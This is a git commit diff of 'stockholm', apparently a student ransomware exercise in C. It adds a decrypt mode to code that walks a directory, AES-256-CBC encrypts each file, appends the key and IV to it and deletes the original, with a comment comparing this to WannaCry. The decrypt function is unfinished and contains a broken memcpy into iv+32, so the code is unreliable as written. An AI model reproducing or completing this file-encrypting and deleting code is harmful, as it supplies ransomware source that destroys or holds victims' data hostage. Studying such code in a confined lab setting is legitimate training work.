8ec360a9875d21f31e2e69ef3784e00d5398c291
Elio Bonutto <elio.bonutto@gmail.com>
2025-07-25 17:03:52 +0200

    debut de la fct decrypt

--- include/stockholm.h
+++ include/stockholm.h
@@ -1,9 +1,9 @@
 #ifndef STOCKHOLM_H
 #define STOCKHOLM_H
 
-typedef struct stockholm_s {
-	unsigned char key[32];
-	unsigned char iv[16];
-} stockholm_t;
+typedef enum e_stockholm_mode {
+	E_ENCRYPT,
+	E_DECRYPT
+} t_stockholm_mode;
 
 #endif
--- src/stockholm.c
+++ src/stockholm.c
@@ -18,26 +18,6 @@ int stockholm_free( FILE *in, FILE *out, EVP_CIPHER_CTX *ctx, int exit_code ) {
 	return ( exit_code );
 }
 
-int stockholm_encrypt_and_store_key_iv( FILE *out, char key[], char iv[] ) {
-	unsigned char aes_blob[48];
-
-	memcmp( aes_blob, key, 32 );
-	memcmp( aes_blob + 32, iv, 16 );
-
-	// RSA *rsa = RSA_new();
-	// if ( !rsa )
-	// 	return ( 1 );
-
-	unsigned char encrypted_blob[512];
-
-	int encrypted_len = RSA_public_encrypt( 48, aes_blob, encrypted_blob, rsa, RSA_PKCS1_OAEP_PADDING );
-	if ( encrypted_len == -1 )
-		return ( 2 );
-
-	if ( fwrite(encrypted_blob, 1, encrypted_len, out) != ( size_t ) encrypted_len )
-
-}
-
 int stockholm_encrypt( const char *filepath ) {
 	printf( "The file that is going to be encrypted: %s\n", filepath );
 
@@ -49,7 +29,7 @@ int stockholm_encrypt( const char *filepath ) {
 	snprintf( outpath, sizeof(outpath), "%s.enc", filepath );
 
 	FILE *out = fopen( outpath, "wb" );
-	if (!out)
+	if ( !out )
 		return ( stockholm_free( in, NULL, NULL, 4 ) );
 
 	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
@@ -82,26 +62,68 @@ int stockholm_encrypt( const char *filepath ) {
 	if ( !EVP_EncryptFinal_ex( ctx, outbuf, &outlen ) )
 		return ( stockholm_free( in, out, ctx, 7 ) );
 
-	if ( fwrite( outbuf, 1, outlen, out ) != ( size_t ) outlen ) {
+	if ( fwrite( outbuf, 1, outlen, out ) != ( size_t ) outlen )
 		return ( stockholm_free( in, out, ctx, 8 ) );
 
 	EVP_CIPHER_CTX_free( ctx );
 	fclose( in );
+
+	unsigned char keyiv[48];
+	// unsigned char encrypted_keyiv[256];
+
+	memcpy( keyiv, key, 32 );
+	memcpy( keyiv + 32, iv, 16 );
+
+	// if ( fwrite( encrypted_keyiv, 1, sizeof(encrypted_keyiv), out ) != ( size_t ) sizeof(encrypted_keyiv) )
+	// 	return ( stockholm_free( NULL, out, NULL, 10 ) );
+
+	if ( fwrite( keyiv, 1, sizeof(keyiv), out ) != ( size_t ) sizeof(keyiv) )
+		return ( stockholm_free( NULL, out, NULL, 10 ) );
+
 	fclose( out );
 
-	snprintf( outpath, sizeof(outpath), "%s.key", filepath );
-	FILE *out = fopen( outpath, "wb" );
-	if (!out) {
-		return ( 9 );
-	}
-
 	remove( filepath ); // Comme WannaCry : supprime le fichier original
-	
 
 	return ( 0 );
 }
 
-void stockholm( const char *dirname )
+int stockholm_decrypt( const char *filepath ) {
+	printf( "The file that is going to be decrypted: %s\n", filepath );
+
+	FILE *in = fopen( filepath, "rb" );
+	if ( !in )
+		return ( 1 );
+
+	char outpath[4096];
+	snprintf( outpath, sizeof(outpath), "%s.dec", filepath );
+
+	FILE *out = fopen( outpath, "wb" );
+	if ( !out )
+		return ( stockholm_free( in, NULL, NULL, 4 ) );
+
+	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+	if ( !ctx )
+		return ( stockholm_free( in, out, NULL, 3 ) );
+
+	
+	unsigned char keyiv[48];
+
+	fseek( in, -48, SEEK_END );
+	fread( keyiv, 1, 48, in );
+
+	unsigned char key[32];
+	unsigned char iv[16];
+
+	memcpy( key, keyiv, 32 );
+	memcpy( iv + 32, keyiv, 16 );
+
+	if ( !EVP_DecryptInit_ex( ctx, EVP_aes_256_cbc(), NULL, key, iv ) )
+		return stockholm_free( in, out, ctx, 7 );
+
+	return ( 0 );
+}
+
+void stockholm( const char *dirname, t_stockholm_mode type )
 {
 	DIR *dir = opendir( dirname ); // We only infect this directory
 	if ( dir == NULL ) {
@@ -124,7 +146,10 @@ void stockholm( const char *dirname )
 			strcat( filepath, dirname );
 			strcat( filepath, "/" );
 			strcat( filepath, entity->d_name );
-			stockholm_encrypt( filepath );
+			if ( type == E_ENCRYPT )
+				stockholm_encrypt( filepath );
+			else if ( type == E_DECRYPT )
+				stockholm_decrypt( filepath );
 		}
 		entity = readdir( dir );
 	}
@@ -132,14 +157,26 @@ void stockholm( const char *dirname )
 	closedir( dir );
 }
 
-int main( void )
+int main( int argc, char **argv )
 {
+	if ( argc != 2 ) {
+		printf( "Invalid number of arguments, only 2 are required !\n" );
+		return ( 1 );
+	}
+
+	if ( strcmp( argv[1], "encrypt" ) == 0 ) {
+		stockholm( "/home/ebonutto/infection", E_ENCRYPT );
+	}
+
+	else if ( strcmp( argv[1], "decrypt" ) == 0 ) {
+		stockholm( "/home/ebonutto/infection", E_DECRYPT );
+	}
+
 	// char path[4096] = "/home/";
 	// char *name;
 	// strcat( path, "/ebonutto" );
 
 	// strcat( path, $USER );
 	// strcat( path, "/infection" );
-	stockholm( "/home/ebonutto/infection" );
 	return ( 0 );
 }
